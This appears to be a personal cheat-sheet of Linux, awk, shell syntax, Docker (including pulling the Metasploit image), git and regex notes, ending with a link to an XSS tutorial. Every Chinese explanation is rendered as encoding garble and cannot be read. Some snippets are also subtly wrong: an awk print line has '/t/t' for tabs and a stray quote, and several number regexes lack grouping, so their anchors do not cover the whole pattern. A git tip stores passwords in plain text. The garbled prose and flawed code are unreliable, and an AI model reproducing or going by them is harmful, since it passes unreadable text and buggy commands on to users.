- åå°æ‰¹é‡ä¸‹è½½ï¼š`wget -b -c -i /opt/download.txt`ï¼Œä¸€ä¸ªä¸‹è½½åœ°å€ä¸€è¡Œ

## å…¶ä»–å¸¸ç”¨å‘½ä»¤

- ç¼–è¾‘ hosts æ–‡ä»¶ï¼š`vim /etc/hosts`ï¼Œæ·»åŠ å†…å®¹æ ¼å¼ï¼š`127.0.0.1 www.youmeek.com`
- RPM æ–‡ä»¶æ“ä½œå‘½ä»¤ï¼š
  - å®‰è£…
    - `rpm -i example.rpm`ï¼Œå®‰è£… example.rpm åŒ…
    - `rpm -iv example.rpm`ï¼Œå®‰è£… example.rpm åŒ…å¹¶åœ¨å®‰è£…è¿‡ç¨‹ä¸­æ˜¾ç¤ºæ­£åœ¨å®‰è£…çš„æ–‡ä»¶ä¿¡æ¯
    - `rpm -ivh example.rpm`ï¼Œå®‰è£… example.rpm åŒ…å¹¶åœ¨å®‰è£…è¿‡ç¨‹ä¸­æ˜¾ç¤ºæ­£åœ¨å®‰è£…çš„æ–‡ä»¶ä¿¡æ¯åŠå®‰è£…è¿›åº¦
  - æŸ¥è¯¢
    - `rpm -qa | grep jdk`ï¼ŒæŸ¥çœ‹ jdk æ˜¯å¦è¢«å®‰è£…
    - `rpm -ql jdk`ï¼ŒæŸ¥çœ‹ jdk æ˜¯å¦è¢«å®‰è£…
  - å¸è½½
    - `rpm -e jdk`ï¼Œå¸è½½ jdkï¼ˆä¸€èˆ¬å¸è½½çš„æ—¶å€™éƒ½è¦å…ˆç”¨ rpm -qa çœ‹ä¸‹æ•´ä¸ªè½¯ä»¶çš„å…¨åï¼‰
- YUM è½¯ä»¶ç®¡ç†ï¼š
  - `yum install -y httpd`ï¼Œå®‰è£… apache
  - `yum remove -y httpd`ï¼Œå¸è½½ apache
  - `yum info -y httpd`ï¼ŒæŸ¥çœ‹ apache ç‰ˆæœ¬ä¿¡æ¯
  - `yum list --showduplicates httpd`ï¼ŒæŸ¥çœ‹å¯ä»¥å®‰è£…çš„ç‰ˆæœ¬
  - `yum install httpd-æŸ¥è¯¢åˆ°çš„ç‰ˆæœ¬å·`ï¼Œå®‰è£…æŒ‡å®šç‰ˆæœ¬
  - æ›´å¤šå‘½ä»¤å¯ä»¥çœ‹ï¼šhttp://man.linuxde.net/yum
- æŸ¥çœ‹æŸä¸ªé…ç½®æ–‡ä»¶ï¼Œæ’é™¤æ‰é‡Œé¢ä»¥ # å¼€å¤´çš„æ³¨é‡Šå†…å®¹ï¼š
  - `grep '^[^#]' /etc/openvpn/server.conf`
- æŸ¥çœ‹æŸä¸ªé…ç½®æ–‡ä»¶ï¼Œæ’é™¤æ‰é‡Œé¢ä»¥ # å¼€å¤´å’Œ ; å¼€å¤´çš„æ³¨é‡Šå†…å®¹ï¼š
  - `grep '^[^#;]' /etc/openvpn/server.conf`

## AWKå‘½ä»¤

`awk '{ print }' /etc/passwd`

æŸ¥çœ‹/etc/passwdå†…å®¹å’Œç”¨catå‘½ä»¤ä¸€æ ·.æŒ‡å®šäº†/etc/passwd ä½œä¸ºè¾“å…¥æ–‡ä»¶ã€‚æ‰§è¡Œ awk æ—¶ï¼Œå®ƒä¾æ¬¡å¯¹ /etc/passwd ä¸­çš„æ¯ä¸€è¡Œæ‰§è¡Œ print å‘½ä»¤

`awk '{ print $0 }' /etc/passwd`

åœ¨ awk ä¸­ï¼Œ $0 å˜é‡è¡¨ç¤ºæ•´ä¸ªå½“å‰è¡Œï¼Œæ‰€ä»¥ print å’Œ print $0 çš„ä½œç”¨å®Œå…¨ä¸€æ ·.

`awk -F":" '{ print $1 }' /etc/passwd`

ä½¿ç”¨ -F é€‰é¡¹æ¥æŒ‡å®š ":" ä½œä¸ºå­—æ®µåˆ†éš”ç¬¦ã€‚awk å¤„ç† print $1 å‘½ä»¤æ—¶ï¼Œå®ƒä¼šæ‰“å°å‡ºåœ¨è¾“å…¥æ–‡ä»¶ä¸­æ¯ä¸€è¡Œä¸­å‡ºç°çš„ç¬¬ä¸€ä¸ªå­—æ®µ(ç¬¬ä¸€åˆ—)ã€‚

`awk -F":" '{ print $1 $3 }' /etc/passwd`

æ‰“å°ç¬¬ä¸€åˆ—å’Œç¬¬ä¸‰åˆ—

`awk -F":" '{ print $1 " " $3 }' /etc/passwd`

æ‰“å°ç¬¬ä¸€åˆ—å’Œç¬¬ä¸‰åˆ—,ç”¨ç©ºæ ¼åˆ†å¼€

awk -F":" '{ print "username: " $1 "/t/tuid:" $3" }' /etc/passwd

æ‹¼æ¥ä¸€äº›å­—ç¬¦ä¸²



å¾…æ›´æ–°

## shellç¼–ç¨‹

**æ‹¼æ¥å­—ç¬¦ä¸²**

```bash
yourname="lihua"

chat="Hello, "$yourname" !"

chat1="Hello, ${yourname} !"

echo ${chat} ${chat1}
```



**ifè¯­å¥**

è¯­æ³•æ ¼å¼

```bash
if condition

then
       command1

fi
```

```bash
if condition

then

       command1


else

       command1

fi
```

```bash
if condition1

then

       command1

elif condition2

then

       command1

else

       commandm

fi
```



æ–‡ä»¶è¡¨è¾¾å¼
-e filename å¦‚æœ filenameå­˜åœ¨ï¼Œåˆ™ä¸ºçœŸ
-d filename å¦‚æœ filenameä¸ºç›®å½•ï¼Œåˆ™ä¸ºçœŸ 
-f filename å¦‚æœ filenameä¸ºå¸¸è§„æ–‡ä»¶ï¼Œåˆ™ä¸ºçœŸ
-L filename å¦‚æœ filenameä¸ºç¬¦å·é“¾æ¥ï¼Œåˆ™ä¸ºçœŸ
-r filename å¦‚æœ filenameå¯è¯»ï¼Œåˆ™ä¸ºçœŸ 
-w filename å¦‚æœ filenameå¯å†™ï¼Œåˆ™ä¸ºçœŸ 
-x filename å¦‚æœ filenameå¯æ‰§è¡Œï¼Œåˆ™ä¸ºçœŸ
-s filename å¦‚æœæ–‡ä»¶é•¿åº¦ä¸ä¸º0ï¼Œåˆ™ä¸ºçœŸ
-h filename å¦‚æœæ–‡ä»¶æ˜¯è½¯é“¾æ¥ï¼Œåˆ™ä¸ºçœŸ
filename1 -nt filename2 å¦‚æœ filename1æ¯” filename2æ–°ï¼Œåˆ™ä¸ºçœŸã€‚
filename1 -ot filename2 å¦‚æœ filename1æ¯” filename2æ—§ï¼Œåˆ™ä¸ºçœŸã€‚


æ•´æ•°å˜é‡è¡¨è¾¾å¼
-eq ç­‰äº
-ne ä¸ç­‰äº
-gt å¤§äº
-ge å¤§äºç­‰äº
-lt å°äº
-le å°äºç­‰äº


å­—ç¬¦ä¸²å˜é‡è¡¨è¾¾å¼
If  [ $a = $b ]         å¦‚æœstring1ç­‰äºstring2ï¼Œåˆ™ä¸ºçœŸ
                å­—ç¬¦ä¸²å…è®¸ä½¿ç”¨èµ‹å€¼å·åšç­‰å·
if  [ $string1 !=  $string2 ]  å¦‚æœstring1ä¸ç­‰äºstring2ï¼Œåˆ™ä¸ºçœŸ    
if  [ -n $string  ]       å¦‚æœstring éç©º(é0ï¼‰ï¼Œè¿”å›0(true)  
if  [ -z $string  ]       å¦‚æœstring ä¸ºç©ºï¼Œåˆ™ä¸ºçœŸ
if  [ $sting ]          å¦‚æœstring éç©ºï¼Œè¿”å›0 (å’Œ-nç±»ä¼¼) 


  é€»è¾‘é !          æ¡ä»¶è¡¨è¾¾å¼çš„ç›¸å
if [ ! è¡¨è¾¾å¼ ]
if [ ! -d $num ]        å¦‚æœä¸å­˜åœ¨ç›®å½•$num


  é€»è¾‘ä¸ â€“a          æ¡ä»¶è¡¨è¾¾å¼çš„å¹¶åˆ—
if [ è¡¨è¾¾å¼1  â€“a  è¡¨è¾¾å¼2 ]


  é€»è¾‘æˆ– -o          æ¡ä»¶è¡¨è¾¾å¼çš„æˆ–
if [ è¡¨è¾¾å¼1  â€“o è¡¨è¾¾å¼2 ]



**forå¾ªç¯**

```
for var in item1

do

    command1

    command2

Done
```

while

```
while condition

do

       command

done
```



# dockerå‘½ä»¤ç¬”è®°

æœç´¢é•œåƒ

```
sudo docker search metasploit
```

æ‹‰å–(ä¸‹è½½)é•œåƒ

```
sudo docker pull metasploitframework/metasploit-framework
```

æŸ¥çœ‹å…¨éƒ¨é•œåƒ

```
sudo docker images
```

ç®€å•è¿è¡Œé•œåƒ

```
sudo docker run metasploitframework/metasploit-framework
```

ç”¨idè¿è¡Œ 

```
sudo docker run 644b96152120
```

äº¤äº’è¿è¡Œé•œåƒ

```
sudo docker run -dit --name msf metasploitframework/metasploit-framework
```

-dit åŒç­‰äº -d -i -t
-i: ä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨ï¼Œé€šå¸¸ä¸ -t åŒæ—¶ä½¿ç”¨ï¼›
-d: åå°è¿è¡Œå®¹å™¨ï¼Œå¹¶è¿”å›å®¹å™¨IDï¼›
-t: ä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯ï¼Œé€šå¸¸ä¸ -i åŒæ—¶ä½¿ç”¨ï¼›
--name="msf": ä¸ºå®¹å™¨æŒ‡å®šä¸€ä¸ªåç§°ï¼Œæ–¹é¢åé¢ç›´æ¥ç”¨åç§°å¯åŠ¨ï¼›

è¿›å…¥å®¹å™¨ç»ˆç«¯(è¿›å…¥å·²ç»åœ¨è¿è¡Œçš„é•œåƒ)

```
sudo docker exec -it msf /bin/bash
```

ç«¯å£æ˜ å°„ï¼Œè¿è¡Œé•œåƒ(å®¹å™¨80åˆ°ä¸»æœº5000)

```
sudo docker run -dit -p 5000:80 --name nginx nginx:latest
```

æŸ¥çœ‹å®¹å™¨çš„ç«¯å£æ˜ å°„

```
sudo docker port nginx
```

å¯åŠ¨å®¹å™¨(è¿è¡Œè¿‡é•œåƒå°±ä¼šå‡ºç°ä¸€ä¸ªå®¹å™¨,æ¯”å¦‚ç”µè„‘é‡å¯å°±éœ€è¦é‡æ–°å¯åŠ¨å®¹å™¨,ä¸éœ€è¦åœ¨é‡æ–°runä¸€ä¸ª)

```
sudo docker start nginx
```

åœæ­¢å®¹å™¨

```
sudo docker stop nginx
```

é‡å¯å®¹å™¨

```
sudo docker restart nginx
```

æŸ¥çœ‹å½“å‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨

```
sudo docker ps
```

æŸ¥çœ‹å…¨éƒ¨ï¼ŒåŒ…æ‹¬å·²ç»åœæ­¢çš„

```
docker ps -a
```

åˆ é™¤å®¹å™¨

```
sudo docker rm å®¹å™¨id
```

å¼ºåˆ¶åˆ é™¤

```
sudo docker rm -f å®¹å™¨id
```

åˆ é™¤é•œåƒ

```
sudo docker rmi é•œåƒid
```

æŸ¥çœ‹ç½‘ç»œ

```
sudo docker network ls
```





# ubuntuè¸©å‘è®°å½•

- unzip å‘½ä»¤è§£å‹windowsä¸‹çš„å‹ç¼©åŒ…ä¹±ç ,å¯ç”¨unarå‘½ä»¤è§£å†³

  ```bash 
  sudo apt install unar
  unar xxx.zip            #ä¸éœ€è¦åŠ å‚æ•°ï¼Œè‡ªåŠ¨è¯†åˆ«ç¼–ç 
  ```

- 



# git ç¬”è®°

## å½“å‰é¡¹ç›®(ä»“åº“)è®°ä½å¯†ç 

1æ ¹ç›®å½•è¾“å…¥:

åŠ --globalå¯ä»¥è®¾ç½®å…¨å±€è®°ä½

```
git config  credential.helper store
```

2ç„¶åæ‰“å¼€.gitæ–‡ä»¶å¤¹çš„configæ–‡ä»¶ï¼Œå›å‘ç°å¤šäº†ä¸¤è¡Œ

```
[credential]
helper=store
```

3åé¢åªéœ€è¦pullæäº¤ä¸€æ¬¡å°±ä¼šè®°ä½å¯†ç 



# ç¼–ç¨‹è¯­è¨€å­¦ä¹ ç¬”è®°

## å¸¸ç”¨æ­£åˆ™

**é‚®ç®±**

`gaozihang-001@gmail.com` åªå…è®¸è‹±æ–‡å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€è‹±æ–‡å¥å·ã€ä»¥åŠä¸­åˆ’çº¿ç»„æˆ

```
^[a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$
```

`é«˜å­èˆª001Abc@bowbee.com.cn` åç§°å…è®¸æ±‰å­—ã€å­—æ¯ã€æ•°å­—ï¼ŒåŸŸååªå…è®¸è‹±æ–‡åŸŸå

```
^[A-Za-z0-9\u4e00-\u9fa5]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$
```

**ç”µè¯**

`13012345678` æ‰‹æœºå·

```
^1(3|4|5|6|7|8|9)\d{9}$
```

`XXX-XXXXXXX` `XXXX-XXXXXXXX` å›ºå®šç”µè¯

```
(\(\d{3,4}\)|\d{3,4}-|\s)?\d{8}
```



**åŸŸå**

https://google.com/

```
^((http:\/\/)|(https:\/\/))?([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}(\/)
```

**IP**

127.0.0.1

```
((?:(?:25[0-5]|2[0-4]\d|[01]?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d?\d))
```

**å¸å·æ ¡éªŒ**

gaozihang_001 å­—æ¯å¼€å¤´ï¼Œå…è®¸5-16å­—èŠ‚ï¼Œå…è®¸å­—æ¯æ•°å­—ä¸‹åˆ’çº¿

```
^[a-zA-Z][a-zA-Z0-9_]{4,15}$
```

å­—ç¬¦æ ¡éªŒ

æ±‰å­—

é«˜å­èˆª

```
^[\u4e00-\u9fa5]{0,}$
```

è‹±æ–‡å’Œæ•°å­—

```
^[A-Za-z0-9]+$
```

é•¿åº¦ä¸º3-20çš„æ‰€æœ‰å­—ç¬¦

```
^.{3,20}$
```

è‹±æ–‡å­—ç¬¦

ç”±26ä¸ªè‹±æ–‡å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²

```
^[A-Za-z]+$
```

ç”±26ä¸ªå¤§å†™è‹±æ–‡å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²

```
^[A-Z]+$
```

ç”±26ä¸ªå°å†™è‹±æ–‡å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²

```
^[a-z]+$
```

ç”±æ•°å­—å’Œ26ä¸ªè‹±æ–‡å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²

```
^[A-Za-z0-9]+$
```

ç”±æ•°å­—ã€26ä¸ªè‹±æ–‡å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿ç»„æˆçš„å­—ç¬¦ä¸²

```
^\w+$
```

ä¸­æ–‡ã€è‹±æ–‡ã€æ•°å­—åŒ…æ‹¬ä¸‹åˆ’çº¿

```
^[\u4E00-\u9FA5A-Za-z0-9_]+$
```

ä¸­æ–‡ã€è‹±æ–‡ã€æ•°å­—ä½†ä¸åŒ…æ‹¬ä¸‹åˆ’çº¿ç­‰ç¬¦å·

```
^[\u4E00-\u9FA5A-Za-z0-9]+$
```

ç¦æ­¢è¾“å…¥å«æœ‰%&',;=?$"ç­‰å­—ç¬¦

```
[^%&',;=?$\x22]+
```

ç¦æ­¢è¾“å…¥å«æœ‰~çš„å­—ç¬¦

```
[^~\x22]+
```

æ•°å­—æ­£åˆ™

æ•´æ•°

```
^-?[1-9]\d*$
```

æ­£æ•´æ•°

```
^[1-9]\d*$
```

è´Ÿæ•´æ•°

```
^-[1-9]\d*$
```

éè´Ÿæ•´æ•°

```
^[1-9]\d*|0$
```

éæ­£æ•´æ•°

```
^-[1-9]\d*|0$
```

æµ®ç‚¹æ•°

```
^-?([1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0)$
```

æ­£æµ®ç‚¹æ•°

```
^[1-9]\d*\.\d*|0\.\d*[1-9]\d*$
```

è´Ÿæµ®ç‚¹æ•°

```
^-([1-9]\d*\.\d*|0\.\d*[1-9]\d*)$
```

éè´Ÿæµ®ç‚¹æ•°

```
^[1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0$
```

éæ­£æµ®ç‚¹æ•°

```
^(-([1-9]\d*\.\d*|0\.\d*[1-9]\d*))|0?\.0+|0$
```





## php



# è¯»ä¹¦ç¬”è®°



# æ¼æ´ç¬”è®°

xsså…¥é—¨https://wizardforcel.gitbooks.io/xss-naxienian/content/1.html
